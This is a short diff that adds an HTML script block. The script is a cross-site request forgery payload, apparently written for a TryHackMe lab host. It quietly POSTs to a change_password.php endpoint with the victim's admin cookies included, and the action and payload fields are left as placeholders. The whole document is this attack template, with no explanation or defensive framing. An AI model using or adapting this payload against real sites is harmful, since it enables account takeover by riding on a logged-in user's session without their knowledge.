@@ -1,0 +1,13 @@
+<script>
+(async () => {
+  const target = 'http://login.worldwap.thm/some/change_password.php';
+  const body = new URLSearchParams({ action: 'whatever', value: 'your payload' });
+
+  await fetch(target, {
+    method: 'POST',            // match the endpoint verb
+    credentials: 'include',    // send admin cookies/session
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: body.toString(),
+  });
+})();
+</script>
